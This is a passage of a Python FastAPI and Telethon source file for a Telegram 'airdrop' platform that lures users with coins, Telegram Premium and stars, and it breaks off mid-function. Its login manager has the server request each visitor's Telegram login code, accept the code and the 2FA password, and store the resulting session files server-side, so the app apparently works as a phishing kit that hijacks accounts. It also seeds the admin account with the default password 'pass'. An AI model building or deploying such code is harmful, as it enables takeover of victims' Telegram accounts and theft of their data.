"""
Pro Shop Ultimate Enterprise Telegram Airdrop & Authentication Platform
Single-file production-grade build.

Stack
-----
- FastAPI + Uvicorn
- Telethon (MTProto User + Bot)
- Async SQLite (aiosqlite)
- JWT Authentication
- Repository Pattern
- WebSocket
- Vanilla JS SPA
"""

from __future__ import annotations

# ==========================
# Standard Library
# ==========================

import asyncio
import base64
import contextlib
import dataclasses
import enum
import hashlib
import html
import json
import logging
import os
import random
import secrets
import shutil
import string
import time

from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import (
    Any,
    AsyncIterator,
    Callable,
    Dict,
    Iterable,
    List,
    Optional,
    Sequence,
    Tuple,
)

# ==========================
# Third Party
# ==========================

import aiosqlite

from fastapi import (
    BackgroundTasks,
    Body,
    Cookie,
    Depends,
    FastAPI,
    File,
    Form,
    Header,
    HTTPException,
    Query,
    Request,
    Response,
    UploadFile,
    WebSocket,
    WebSocketDisconnect,
    status,
)

from fastapi.middleware.cors import CORSMiddleware

from fastapi.responses import (
    FileResponse,
    HTMLResponse,
    JSONResponse,
    PlainTextResponse,
    RedirectResponse,
    StreamingResponse,
)

from fastapi.security import (
    APIKeyHeader,
    HTTPAuthorizationCredentials,
    HTTPBearer,
    OAuth2PasswordBearer,
)

from jose import JWTError, jwt

from pydantic import BaseModel, Field

from pydantic_settings import (
    BaseSettings,
    SettingsConfigDict,
)

from starlette.middleware.base import BaseHTTPMiddleware

# ==========================
# Optional Dependencies
# ==========================

try:
    import bcrypt
except ImportError:
    bcrypt = None

# ==========================
# Telethon
# ==========================

try:
    from telethon import (
        Button,
        TelegramClient,
        events,
    )

    from telethon.errors import (
        FloodWaitError,
        PhoneCodeExpiredError,
        PhoneCodeInvalidError,
        PhoneNumberBannedError,
        SessionPasswordNeededError,
        UserNotParticipantError,
    )

    from telethon.tl.types import (
        KeyboardButtonWebView,
        User,
    )

except ImportError:

    TelegramClient = Any
    Button = Any
    events = Any
    KeyboardButtonWebView = Any
    User = Any

    FloodWaitError = Exception
    PhoneCodeExpiredError = Exception
    PhoneCodeInvalidError = Exception
    PhoneNumberBannedError = Exception
    SessionPasswordNeededError = Exception
    UserNotParticipantError = Exception

# ==========================
# Logger
# ==========================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)

logger = logging.getLogger("proshop")
# =============================================================================
# Configuration
# =============================================================================

class AppEnv(str, enum.Enum):
    DEVELOPMENT = "development"
    PRODUCTION = "production"
    STAGING = "staging"


class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", env_file_encoding="utf-8", extra="ignore")

    API_ID: int = Field(..., description="Telegram API ID")
    API_HASH: str = Field(..., description="Telegram API HASH")
    TOKEN_BOT: str = Field(..., description="Telegram bot token")

    BOT_USERNAME: str = Field(default="YourBot")
    WEB_APP_URL: str = Field(default="https://example.com")
    REQUIRED_CHANNELS: str = Field(default="ProShopChannel,ProShopNews,ProShopSupport")

    ENVIRONMENT: AppEnv = AppEnv.PRODUCTION
    SECRET_KEY: str = Field(default_factory=lambda: secrets.token_hex(32))
    JWT_ALGORITHM: str = "HS256"
    ACCESS_TOKEN_EXPIRE_MINUTES: int = 60 * 24 * 7

    ADMIN_USERNAME: str = "admin"
    ADMIN_PASSWORD_HASH: str = Field(default="")
    ADMIN_API_KEY: str = Field(default_factory=lambda: secrets.token_hex(24))

    DATA_DIR: str = "data"
    DB_FILE: str = "data/proshop.sqlite3"
    SESSION_DIR: str = "sessions"
    LOG_DIR: str = "logs"
    LOG_FILE: str = "logs/proshop.log"

    MAX_BOT_SESSIONS: int = 10_000
    SESSION_TIMEOUT_SECONDS: int = 600
    RATE_LIMIT_PER_MINUTE: int = 30

    ENABLE_BOT: bool = True
    ENABLE_WEB: bool = True
    ENABLE_USERBOT: bool = True


settings = Settings()


class AppPaths:
    BASE = Path(__file__).parent.resolve()
    DATA = BASE / settings.DATA_DIR
    DB = BASE / settings.DB_FILE
    SESSIONS = BASE / settings.SESSION_DIR
    LOGS = BASE / settings.LOG_DIR
    LOG_FILE = BASE / settings.LOG_FILE


for p in (AppPaths.DATA, AppPaths.SESSIONS, AppPaths.LOGS):
    p.mkdir(parents=True, exist_ok=True)


# =============================================================================
# Logging
# =============================================================================

class JsonFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        payload = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "lvl": record.levelname,
            "logger": record.name,
            "msg": record.getMessage(),
            "module": record.module,
            "func": record.funcName,
            "line": record.lineno,
        }
        if record.exc_info:
            payload["exception"] = self.formatException(record.exc_info)
        return json.dumps(payload, ensure_ascii=False)


def build_logger() -> logging.Logger:
    logger = logging.getLogger("proshop")
    if logger.handlers:
        return logger
    logger.setLevel(logging.DEBUG if settings.ENVIRONMENT == AppEnv.DEVELOPMENT else logging.INFO)

    file_handler = logging.FileHandler(AppPaths.LOG_FILE, encoding="utf-8")
    file_handler.setFormatter(JsonFormatter())
    file_handler.setLevel(logging.DEBUG)

    stream_handler = logging.StreamHandler()
    stream_handler.setFormatter(logging.Formatter("%(asctime)s | %(levelname)s | %(message)s"))
    stream_handler.setLevel(logging.INFO)

    logger.addHandler(file_handler)
    logger.addHandler(stream_handler)
    logger.propagate = False
    return logger


log = build_logger()


# =============================================================================
# Exceptions
# =============================================================================

class ProShopError(Exception):
    """Base application exception."""


class AuthenticationError(ProShopError):
    """Authentication failure."""


class AuthorizationError(ProShopError):
    """Authorization failure."""


class ResourceNotFoundError(ProShopError):
    """Resource not found."""


class ValidationProShopError(ProShopError):
    """Validation failure."""


class AirdropError(ProShopError):
    """Airdrop-specific failure."""


# =============================================================================
# Security utilities
# =============================================================================

class Security:
    @staticmethod
    def utcnow() -> datetime:
        return datetime.now(timezone.utc)

    @staticmethod
    def normalize_phone(phone: str) -> str:
        if not phone:
            return ""
        phone = phone.strip().replace(" ", "")
        if phone.startswith("00"):
            phone = "+" + phone[2:]
        if not phone.startswith("+") and phone.isdigit():
            phone = "+" + phone
        phone = "".join(ch for ch in phone if ch.isdigit() or ch == "+")
        return phone

    @staticmethod
    def valid_phone(phone: str) -> bool:
        return bool(phone and phone.startswith("+") and 7 <= len(phone) <= 16 and phone[1:].isdigit())

    @staticmethod
    def hash_admin_password(password: str) -> str:
        if bcrypt is None:
            raise RuntimeError("bcrypt is required. Install bcrypt or passlib with bcrypt backend.")
        salt = bcrypt.gensalt(rounds=12)
        return bcrypt.hashpw(password.encode("utf-8"), salt).decode("utf-8")

    @staticmethod
    def verify_admin_password(password: str, hashed: str) -> bool:
        if bcrypt is None:
            raise RuntimeError("bcrypt is required. Install bcrypt or passlib with bcrypt backend.")
        return bcrypt.checkpw(password.encode("utf-8"), hashed.encode("utf-8"))

    @staticmethod
    def sign_jwt(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
        payload = {
            "sub": subject,
            "iat": int(time.time()),
            "exp": int((Security.utcnow() + timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES)).timestamp()),
        }
        if claims:
            payload.update(claims)
        return jwt.encode(payload, settings.SECRET_KEY, algorithm=settings.JWT_ALGORITHM)

    @staticmethod
    def decode_jwt(token: str) -> Dict[str, Any]:
        try:
            return jwt.decode(token, settings.SECRET_KEY, algorithms=[settings.JWT_ALGORITHM])
        except JWTError as exc:
            raise AuthorizationError("Invalid or expired session token.") from exc

    @staticmethod
    def csrf_token() -> str:
        return secrets.token_urlsafe(32)

    @staticmethod
    def api_key_ok(key: str) -> bool:
        return key == settings.ADMIN_API_KEY

    @staticmethod
    def masked(value: str, visible: int = 4) -> str:
        if not value:
            return ""
        if len(value) <= visible:
            return "*" * len(value)
        return "*" * (len(value) - visible) + value[-visible:]


# =============================================================================
# Pydantic models
# =============================================================================

class LoginInitRequest(BaseModel):
    phone: str
    ref_code: Optional[str] = None


class VerifyCodeRequest(BaseModel):
    session_id: str
    code: str = Field(min_length=3, max_length=8)


class Verify2FARequest(BaseModel):
    session_id: str
    password: str = Field(min_length=1)


class TaskCreateRequest(BaseModel):
    title: str
    description: str
    reward: int = Field(ge=0, le=10_000)
    kind: str = Field(default="custom")
    target_url: Optional[str] = None
    active: bool = True


class TaskCompleteRequest(BaseModel):
    task_id: int


class BoxOpenRequest(BaseModel):
    pass


class AdminLoginRequest(BaseModel):
    username: str
    password: str


class UserOut(BaseModel):
    id: int
    telegram_id: int
    first_name: str = ""
    last_name: str = ""
    username: str = ""
    phone: str = ""
    balance: int = 0
    ref_code: str = ""
    referrals: int = 0
    invited_by: Optional[str] = None
    daily_claim_at: Optional[str] = None
    created_at: str = ""
    updated_at: str = ""


class RewardOut(BaseModel):
    id: int
    user_id: int
    kind: str
    amount: str
    meta: Dict[str, Any] = Field(default_factory=dict)
    created_at: str


class TaskOut(BaseModel):
    id: int
    title: str
    description: str
    reward: int
    kind: str
    target_url: Optional[str] = None
    active: bool = True
    created_at: str


class TransactionOut(BaseModel):
    id: int
    user_id: int
    kind: str
    amount: int
    meta: Dict[str, Any] = Field(default_factory=dict)
    created_at: str


# =============================================================================
# SQLite database and repositories
# =============================================================================

SCHEMA_SQL = """
PRAGMA journal_mode=WAL;
PRAGMA synchronous=NORMAL;

CREATE TABLE IF NOT EXISTS admins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password_hash TEXT NOT NULL,
    api_key TEXT NOT NULL UNIQUE,
    created_at TEXT NOT NULL,
    updated_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    telegram_id INTEGER NOT NULL UNIQUE,
    first_name TEXT NOT NULL DEFAULT '',
    last_name TEXT NOT NULL DEFAULT '',
    username TEXT NOT NULL DEFAULT '',
    phone TEXT NOT NULL DEFAULT '',
    balance INTEGER NOT NULL DEFAULT 0,
    ref_code TEXT NOT NULL UNIQUE,
    referrals INTEGER NOT NULL DEFAULT 0,
    invited_by TEXT,
    daily_claim_at TEXT,
    session_file TEXT NOT NULL DEFAULT '',
    login_date TEXT NOT NULL DEFAULT '',
    created_at TEXT NOT NULL,
    updated_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS rewards (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    kind TEXT NOT NULL,
    amount TEXT NOT NULL,
    meta TEXT NOT NULL DEFAULT '{}',
    created_at TEXT NOT NULL,
    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS tasks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    title TEXT NOT NULL,
    description TEXT NOT NULL,
    reward INTEGER NOT NULL DEFAULT 0,
    kind TEXT NOT NULL DEFAULT 'custom',
    target_url TEXT,
    active INTEGER NOT NULL DEFAULT 1,
    created_at TEXT NOT NULL,
    updated_at TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS task_completions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    task_id INTEGER NOT NULL,
    status TEXT NOT NULL DEFAULT 'completed',
    completed_at TEXT NOT NULL,
    UNIQUE(user_id, task_id),
    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE,
    FOREIGN KEY(task_id) REFERENCES tasks(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS transactions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    kind TEXT NOT NULL,
    amount INTEGER NOT NULL,
    meta TEXT NOT NULL DEFAULT '{}',
    created_at TEXT NOT NULL,
    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
);

CREATE TABLE IF NOT EXISTS sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    session_id TEXT NOT NULL UNIQUE,
    phone TEXT NOT NULL,
    state TEXT NOT NULL,
    ref_code TEXT,
    created_at TEXT NOT NULL,
    updated_at TEXT NOT NULL,
    expires_at TEXT NOT NULL,
    FOREIGN KEY(user_id) REFERENCES users(id) ON DELETE CASCADE
);

CREATE INDEX IF NOT EXISTS idx_users_telegram_id ON users(telegram_id);
CREATE INDEX IF NOT EXISTS idx_users_ref_code ON users(ref_code);
CREATE INDEX IF NOT EXISTS idx_rewards_user_id ON rewards(user_id);
CREATE INDEX IF NOT EXISTS idx_transactions_user_id ON transactions(user_id);
CREATE INDEX IF NOT EXISTS idx_tasks_active ON tasks(active);
CREATE INDEX IF NOT EXISTS idx_sessions_session_id ON sessions(session_id);
CREATE INDEX IF NOT EXISTS idx_task_completions_user_task ON task_completions(user_id, task_id);
"""


class Database:
    def __init__(self, path: Path):
        self.path = path
        self.conn: Optional[aiosqlite.Connection] = None
        self._lock = asyncio.Lock()

    async def connect(self) -> None:
        if self.conn is not None:
            return
        self.conn = await aiosqlite.connect(self.path.as_posix())
        self.conn.row_factory = aiosqlite.Row
        await self.conn.executescript(SCHEMA_SQL)
        await self.conn.commit()
        await self.ensure_seed()

    async def close(self) -> None:
        if self.conn is not None:
            await self.conn.close()
            self.conn = None

    @contextlib.asynccontextmanager
    async def transaction(self) -> AsyncIterator[aiosqlite.Connection]:
        if self.conn is None:
            raise RuntimeError("Database not connected.")
        async with self._lock:
            await self.conn.execute("BEGIN")
            try:
                yield self.conn
                await self.conn.commit()
            except Exception:
                await self.conn.rollback()
                raise

    async def execute(self, sql: str, params: Sequence[Any] = ()) -> aiosqlite.Cursor:
        if self.conn is None:
            raise RuntimeError("Database not connected.")
        return await self.conn.execute(sql, params)

    async def executemany(self, sql: str, params: Sequence[Sequence[Any]]) -> None:
        if self.conn is None:
            raise RuntimeError("Database not connected.")
        await self.conn.executemany(sql, params)

    async def fetchone(self, sql: str, params: Sequence[Any] = ()) -> Optional[aiosqlite.Row]:
        if self.conn is None:
            raise RuntimeError("Database not connected.")
        cur = await self.conn.execute(sql, params)
        return await cur.fetchone()

    async def fetchall(self, sql: str, params: Sequence[Any] = ()) -> List[aiosqlite.Row]:
        if self.conn is None:
            raise RuntimeError("Database not connected.")
        cur = await self.conn.execute(sql, params)
        return await cur.fetchall()

    async def ensure_seed(self) -> None:
        admin_row = await self.fetchone("SELECT id FROM admins LIMIT 1")
        if admin_row is None:
            hash_ = settings.ADMIN_PASSWORD_HASH or Security.hash_admin_password("pass")
            now = Security.utcnow().isoformat()
            await self.execute(
                "INSERT INTO admins(username, password_hash, api_key, created_at, updated_at) VALUES (?, ?, ?, ?, ?)",
                (settings.ADMIN_USERNAME, hash_, settings.ADMIN_API_KEY, now, now),
            )
            await self.conn.commit()  # type: ignore[union-attr]

        tasks_count = await self.fetchone("SELECT COUNT(*) AS c FROM tasks")
        if tasks_count and int(tasks_count["c"]) == 0:
            now = Security.utcnow().isoformat()
            seed_tasks = [
                ("Join Telegram Channel", "Join the official channel", 1, "join", "https://t.me/" + settings.BOT_USERNAME, 1, now, now),
                ("Open Dashboard", "Visit your profile dashboard", 1, "visit", settings.WEB_APP_URL, 1, now, now),
                ("Follow Announcements", "Stay updated with platform news", 1, "follow", "https://t.me/" + settings.BOT_USERNAME, 1, now, now),
            ]
            await self.executemany(
                "INSERT INTO tasks(title, description, reward, kind, target_url, active, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                seed_tasks,
            )
            await self.conn.commit()  # type: ignore[union-attr]


db = Database(AppPaths.DB)


@dataclass
class UserRepo:
    db: Database

    async def create_or_update_user(
        self,
        telegram_id: int,
        first_name: str = "",
        last_name: str = "",
        username: str = "",
        phone: str = "",
        session_file: str = "",
        login_date: str = "",
        invited_by: Optional[str] = None,
    ) -> Dict[str, Any]:
        now = Security.utcnow().isoformat()
        ref_code = secrets.token_hex(4)
        existing = await self.get_by_telegram_id(telegram_id)
        if existing:
            ref_code = existing["ref_code"]
            invited_by = existing["invited_by"] if existing["invited_by"] else invited_by

        async with self.db.transaction():
            if existing:
                await self.db.execute(
                    """
                    UPDATE users
                    SET first_name=?, last_name=?, username=?, phone=?, session_file=?, login_date=?, invited_by=COALESCE(invited_by, ?), updated_at=?
                    WHERE telegram_id=?
                    """,
                    (first_name, last_name, username, phone, session_file, login_date, invited_by, now, telegram_id),
                )
            else:
                await self.db.execute(
                    """
                    INSERT INTO users(telegram_id, first_name, last_name, username, phone, balance, ref_code, referrals, invited_by, daily_claim_at, session_file, login_date, created_at, updated_at)
                    VALUES (?, ?, ?, ?, ?, 0, ?, 0, ?, NULL, ?, ?, ?, ?)
                    """,
                    (telegram_id, first_name, last_name, username, phone, ref_code, invited_by, session_file, login_date, now, now),
                )
            row = await self.get_by_telegram_id(telegram_id)
            return row or {}

    async def get_by_id(self, id_: int) -> Optional[Dict[str, Any]]:
        row = await self.db.fetchone("SELECT * FROM users WHERE id=?", (id_,))
        return dict(row) if row else None

    async def get_by_telegram_id(self, telegram_id: int) -> Optional[Dict[str, Any]]:
        row = await self.db.fetchone("SELECT * FROM users WHERE telegram_id=?", (telegram_id,))
        return dict(row) if row else None

    async def get_by_ref_code(self, ref_code: str) -> Optional[Dict[str, Any]]:
        row = await self.db.fetchone("SELECT * FROM users WHERE ref_code=?", (ref_code,))
        return dict(row) if row else None

    async def list_top(self, limit: int = 10) -> List[Dict[str, Any]]:
        rows = await self.db.fetchall(
            "SELECT * FROM users ORDER BY referrals DESC, balance DESC, id ASC LIMIT ?",
            (limit,),
        )
        return [dict(r) for r in rows]

    async def increment_balance(self, user_id: int, amount: int, kind: str, meta: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        now = Security.utcnow().isoformat()
        meta_json = json.dumps(meta or {}, ensure_ascii=False)
        async with self.db.transaction():
            await self.db.execute("UPDATE users SET balance = balance + ?, updated_at=? WHERE id=?", (amount, now, user_id))
            await self.db.execute(
                "INSERT INTO transactions(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
                (user_id, kind, amount, meta_json, now),
            )
        user = await self.get_by_id(user_id)
        return user or {}

    async def apply_referral(self, inviter_ref_code: str, new_user_id: int) -> bool:
        inviter = await self.get_by_ref_code(inviter_ref_code)
        if not inviter:
            return False
        if inviter["id"] == new_user_id:
            return False

        current = await self.get_by_id(new_user_id)
        if not current:
            return False
        if current["invited_by"]:
            return False

        now = Security.utcnow().isoformat()
        async with self.db.transaction():
            await self.db.execute(
                "UPDATE users SET invited_by=?, updated_at=? WHERE id=?",
                (inviter_ref_code, now, new_user_id),
            )
            await self.db.execute(
                "UPDATE users SET balance = balance + 1, referrals = referrals + 1, updated_at=? WHERE id=?",
                (now, inviter["id"]),
            )
            await self.db.execute(
                "INSERT INTO rewards(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
                (
                    inviter["id"],
                    "referral",
                    "1",
                    json.dumps({"new_user_id": new_user_id, "ref_code": inviter_ref_code}, ensure_ascii=False),
                    now,
                ),
            )
            await self.db.execute(
                "INSERT INTO transactions(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
                (inviter["id"], "referral_reward", 1, json.dumps({"new_user_id": new_user_id}, ensure_ascii=False), now),
            )
        return True

    async def daily_claim(self, user_id: int) -> Dict[str, Any]:
        user = await self.get_by_id(user_id)
        if not user:
            raise ResourceNotFoundError("User not found.")
        now = Security.utcnow()
        last = user.get("daily_claim_at")
        if last:
            try:
                last_dt = datetime.fromisoformat(last)
                if last_dt.tzinfo is None:
                    last_dt = last_dt.replace(tzinfo=timezone.utc)
                if now - last_dt < timedelta(hours=24):
                    left = timedelta(hours=24) - (now - last_dt)
                    raise AirdropError(f"Daily reward already claimed. Try again in {str(left).split('.')[0]}.")
            except ValueError:
                pass

        ts = now.isoformat()
        async with self.db.transaction():
            await self.db.execute(
                "UPDATE users SET balance = balance + 1, daily_claim_at=?, updated_at=? WHERE id=?",
                (ts, ts, user_id),
            )
            await self.db.execute(
                "INSERT INTO rewards(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
                (user_id, "daily", "1", "{}", ts),
            )
            await self.db.execute(
                "INSERT INTO transactions(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
                (user_id, "daily_claim", 1, "{}", ts),
            )
        refreshed = await self.get_by_id(user_id)
        return {"new_balance": refreshed["balance"] if refreshed else 0, "reward": 1}

    async def mystery_box(self, user_id: int) -> Dict[str, Any]:
        user = await self.get_by_id(user_id)
        if not user:
            raise ResourceNotFoundError("User not found.")
        if int(user["balance"]) < 17:
            raise AirdropError("You need at least 17 coins to open a Mystery Box.")

        now = Security.utcnow().isoformat()
        roll = random.random()
        # weighted outcome
        if roll < 0.02:
            reward = {"type": "premium", "amount": "1 Month"}
        elif roll < 0.12:
            reward = {"type": "stars", "amount": random.randint(40, 50)}
        elif roll < 0.30:
            reward = {"type": "stars", "amount": random.randint(20, 39)}
        elif roll < 0.65:
            reward = {"type": "stars", "amount": random.randint(6, 19)}
        else:
            reward = {"type": "stars", "amount": random.randint(1, 5)}

        async with self.db.transaction():
            await self.db.execute(
                "UPDATE users SET balance = balance - 17, updated_at=? WHERE id=?",
                (now, user_id),
            )
            await self.db.execute(
                "INSERT INTO rewards(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
                (user_id, reward["type"], str(reward["amount"]), json.dumps({"box": True}, ensure_ascii=False), now),
            )
            await self.db.execute(
                "INSERT INTO transactions(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
                (user_id, "mystery_box", -17, json.dumps(reward, ensure_ascii=False), now),
            )
        refreshed = await self.get_by_id(user_id)
        return {"reward": reward, "new_balance": refreshed["balance"] if refreshed else 0}

    async def rewards_for_user(self, user_id: int, limit: int = 20) -> List[Dict[str, Any]]:
        rows = await self.db.fetchall(
            "SELECT * FROM rewards WHERE user_id=? ORDER BY id DESC LIMIT ?",
            (user_id, limit),
        )
        out: List[Dict[str, Any]] = []
        for row in rows:
            item = dict(row)
            item["meta"] = json.loads(item["meta"] or "{}")
            out.append(item)
        return out


@dataclass
class TaskRepo:
    db: Database

    async def list_active(self) -> List[Dict[str, Any]]:
        rows = await self.db.fetchall("SELECT * FROM tasks WHERE active=1 ORDER BY id DESC")
        return [dict(r) for r in rows]

    async def create(self, payload: TaskCreateRequest) -> Dict[str, Any]:
        now = Security.utcnow().isoformat()
        async with self.db.transaction():
            cur = await self.db.execute(
                """
                INSERT INTO tasks(title, description, reward, kind, target_url, active, created_at, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                """,
                (payload.title, payload.description, payload.reward, payload.kind, payload.target_url, int(payload.active), now, now),
            )
        row = await self.db.fetchone("SELECT * FROM tasks WHERE id=?", (cur.lastrowid,))
        return dict(row) if row else {}

    async def complete(self, user_id: int, task_id: int) -> Dict[str, Any]:
        now = Security.utcnow().isoformat()
        task = await self.db.fetchone("SELECT * FROM tasks WHERE id=? AND active=1", (task_id,))
        if not task:
            raise ResourceNotFoundError("Task not found.")
        try:
            async with self.db.transaction():
                await self.db.execute(
                    "INSERT INTO task_completions(user_id, task_id, status, completed_at) VALUES (?, ?, 'completed', ?)",
                    (user_id, task_id, now),
                )
                await self.db.execute("UPDATE users SET balance = balance + ?, updated_at=? WHERE id=?", (int(task["reward"]), now, user_id))
                await self.db.execute(
                    "INSERT INTO rewards(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
                    (user_id, "task", str(task["reward"]), json.dumps({"task_id": task_id, "title": task["title"]}, ensure_ascii=False), now),
                )
                await self.db.execute(
                    "INSERT INTO transactions(user_id, kind, amount, meta, created_at) VALUES (?, ?, ?, ?, ?)",
                    (user_id, "task_reward", int(task["reward"]), json.dumps({"task_id": task_id}, ensure_ascii=False), now),
                )
        except aiosqlite.IntegrityError as exc:
            raise AirdropError("Task already completed.") from exc

        return {"task_id": task_id, "reward": int(task["reward"])}


@dataclass
class TransactionRepo:
    db: Database

    async def list_by_user(self, user_id: int, limit: int = 50) -> List[Dict[str, Any]]:
        rows = await self.db.fetchall("SELECT * FROM transactions WHERE user_id=? ORDER BY id DESC LIMIT ?", (user_id, limit))
        out: List[Dict[str, Any]] = []
        for row in rows:
            item = dict(row)
            item["meta"] = json.loads(item["meta"] or "{}")
            out.append(item)
        return out


@dataclass
class SessionRepo:
    db: Database

    async def upsert(
        self,
        user_id: int,
        session_id: str,
        phone: str,
        state: str,
        ref_code: Optional[str] = None,
        ttl_seconds: int = 600,
    ) -> None:
        now = Security.utcnow()
        expires = now + timedelta(seconds=ttl_seconds)
        async with self.db.transaction():
            row = await self.db.fetchone("SELECT id FROM sessions WHERE session_id=?", (session_id,))
            if row:
                await self.db.execute(
                    "UPDATE sessions SET state=?, ref_code=?, updated_at=?, expires_at=? WHERE session_id=?",
                    (state, ref_code, now.isoformat(), expires.isoformat(), session_id),
                )
            else:
                await self.db.execute(
                    """
                    INSERT INTO sessions(user_id, session_id, phone, state, ref_code, created_at, updated_at, expires_at)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    """,
                    (user_id, session_id, phone, state, ref_code, now.isoformat(), now.isoformat(), expires.isoformat()),
                )

    async def delete(self, session_id: str) -> None:
        async with self.db.transaction():
            await self.db.execute("DELETE FROM sessions WHERE session_id=?", (session_id,))


user_repo = UserRepo(db)
task_repo = TaskRepo(db)
tx_repo = TransactionRepo(db)
session_repo = SessionRepo(db)


# =============================================================================
# WebSocket hub
# =============================================================================

class SocketHub:
    def __init__(self):
        self._clients: set[WebSocket] = set()
        self._lock = asyncio.Lock()

    async def connect(self, ws: WebSocket) -> None:
        await ws.accept()
        async with self._lock:
            self._clients.add(ws)

    async def disconnect(self, ws: WebSocket) -> None:
        async with self._lock:
            self._clients.discard(ws)

    async def broadcast(self, event: str, data: Dict[str, Any]) -> None:
        payload = json.dumps({"event": event, "data": data}, ensure_ascii=False)
        async with self._lock:
            clients = list(self._clients)
        to_drop: List[WebSocket] = []
        for ws in clients:
            try:
                await ws.send_text(payload)
            except Exception:
                to_drop.append(ws)
        if to_drop:
            async with self._lock:
                for ws in to_drop:
                    self._clients.discard(ws)


hub = SocketHub()


# =============================================================================
# Telegram userbot auth manager
# =============================================================================

class SessionState(str, enum.Enum):
    INITIALIZED = "INITIALIZED"
    CODE_SENT = "CODE_SENT"
    AWAITING_2FA = "AWAITING_2FA"
    LOGGED_IN = "LOGGED_IN"
    ERROR = "ERROR"
    EXPIRED = "EXPIRED"


@dataclass
class SessionContext:
    session_id: str
    phone: Optional[str] = None
    client: Any = None
    phone_code_hash: Optional[str] = None
    state: SessionState = SessionState.INITIALIZED
    attempts: int = 0
    created_at: float = field(default_factory=time.time)
    last_access: float = field(default_factory=time.time)
    ref_code: Optional[str] = None


class TelegramAuthManager:
    def __init__(self):
        self.sessions: Dict[str, SessionContext] = {}
        self.phone_to_session: Dict[str, str] = {}
        self._lock = asyncio.Lock()

    async def _new_client(self, session_id: str) -> Any:
        session_file = (AppPaths.SESSIONS / f"{session_id}.session").as_posix()
        client = TelegramClient(session_file, settings.API_ID, settings.API_HASH)
        await client.connect()
        return client

    async def _cleanup(self) -> None:
        now = time.time()
        expired = [sid for sid, ctx in self.sessions.items() if now - ctx.last_access > settings.SESSION_TIMEOUT_SECONDS]
        for sid in expired:
            ctx = self.sessions.pop(sid, None)
            if ctx and ctx.phone and self.phone_to_session.get(ctx.phone) == sid:
                self.phone_to_session.pop(ctx.phone, None)
            if ctx and ctx.client:
                try:
                    await ctx.client.disconnect()
                except Exception:
                    pass

    async def get_or_create(self, session_id: Optional[str] = None, phone: Optional[str] = None) -> SessionContext:
        async with self._lock:
            await self._cleanup()
            if session_id and session_id in self.sessions:
                ctx = self.sessions[session_id]
                ctx.last_access = time.time()
                if ctx.client and not getattr(ctx.client, "is_connected", lambda: False)():
                    await ctx.client.connect()
                return ctx

            if phone and phone in self.phone_to_session:
                existing = self.phone_to_session[phone]
                if existing in self.sessions:
                    old_ctx = self.sessions.pop(existing)
                    if old_ctx.client:
                        with contextlib.suppress(Exception):
                            await old_ctx.client.disconnect()
                self.phone_to_session.pop(phone, None)

            if len(self.sessions) >= settings.MAX_BOT_SESSIONS:
                raise HTTPException(status_code=503, detail="Server at maximum session capacity.")

            sid = session_id or f"sess_{secrets.token_hex(12)}"
            client = await self._new_client(sid)
            ctx = SessionContext(session_id=sid, client=client, phone=phone)
            self.sessions[sid] = ctx
            if phone:
                self.phone_to_session[phone] = sid
            return ctx

    async def send_code(self, phone: str, ref_code: Optional[str] = None) -> Dict[str, Any]:
        phone = Security.normalize_phone(phone)
        if not Security.valid_phone(phone):
            raise HTTPException(status_code=400, detail="Invalid phone format.")
        ctx = await self.get_or_create(phone=phone)
        ctx.phone = phone
        ctx.ref_code = ref_code
        try:
            res = await ctx.client.send_code_request(phone)
            ctx.phone_code_hash = res.phone_code_hash
            ctx.state = SessionState.CODE_SENT
            await session_repo.upsert(user_id=0, session_id=ctx.session_id, phone=phone, state=ctx.state.value, ref_code=ref_code)
            return {"status": "success", "session_id": ctx.session_id, "message": "Verification code sent to Telegram app."}
        except FloodWaitError as exc:
            raise HTTPException(status_code=429, detail=f"Flood wait. Try again in {exc.seconds} seconds.") from exc
        except PhoneNumberBannedError as exc:
            raise HTTPException(status_code=403, detail="This phone number is banned from Telegram.") from exc
        except Exception as exc:
            ctx.state = SessionState.ERROR
            raise HTTPException(status_code=400, detail=str(exc)) from exc

    async def verify_code(self, session_id: str, code: str) -> Dict[str, Any]:
        ctx = await self.get_or_create(session_id=session_id)
        if ctx.state not in (SessionState.CODE_SENT, SessionState.ERROR):
            raise HTTPException(status_code=400, detail="Session is not waiting for code.")
        if not ctx.phone_code_hash:
